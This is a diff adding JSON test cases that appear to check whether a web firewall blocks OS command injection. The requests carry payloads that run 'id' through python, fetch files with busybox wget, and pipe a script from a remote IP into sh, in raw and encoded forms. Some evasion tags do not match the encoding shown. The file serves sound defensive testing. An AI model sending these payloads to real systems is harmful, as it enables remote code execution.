+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"; python -c 'import os;os.system(\\\"id\\\")'\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0067",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [urlencode]",
+    "description": "OS command injection via body:format: ; python -c 'import os;os.system(\"id\")'",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"; python -c 'import os;os.system(\\\"id\\\")'\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0068",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [double-urlencode]",
+    "description": "OS command injection via path: ; python -c 'import os;os.system(\"id\")'",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%3B%20python%20-c%20%27import%20os%3Bos.system%28%22id%22%29%27",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0069",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [urlencode]",
+    "description": "OS command injection via query:name: ; busybox wget http://x/s",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%3B%20busybox%20wget%20http%3A%2F%2Fx%2Fs",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0070",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [urlencode]",
+    "description": "OS command injection via body:comment: ; busybox wget http://x/s",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"; busybox wget http://x/s\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0071",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [raw]",
+    "description": "OS command injection via body:format: ; busybox wget http://x/s",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"; busybox wget http://x/s\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0072",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [raw]",
+    "description": "OS command injection via path: ; busybox wget http://x/s",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%3B%20busybox%20wget%20http%3A%2F%2Fx%2Fs",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0073",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [double-urlencode]",
+    "description": "OS command injection via query:name: `curl -sk https://14.46.136.77/sh|sh`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%2560curl%2520-sk%2520https%253A%252F%252F14.46.136.77%252Fsh%257Csh%2560",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0074",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [nullbyte-suffix]",
+    "description": "OS command injection via body:comment: `curl -sk https://14.46.136.77/sh|sh`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"`curl -sk https://14.46.136.77/sh|sh`\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0075",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [double-urlencode]",
+    "description": "OS command injection via body:format: `curl -sk https://14.46.136.77/sh|sh`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"`curl -sk https://14.46.136.77/sh|sh`\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0076",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [double-urlencode]",
+    "description": "OS command injection via path: `curl -sk https://14.46.136.77/sh|sh`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%60curl%20-sk%20https%3A%2F%2F14.46.136.77%2Fsh%7Csh%60",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  }
+]
